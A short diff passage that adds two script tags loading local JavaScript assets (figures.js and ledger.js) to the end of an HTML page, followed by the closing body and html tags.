+<script src="../assets/figures.js" data-root="../"></script>
+<script src="../assets/ledger.js"></script>
+</body>
+</html>
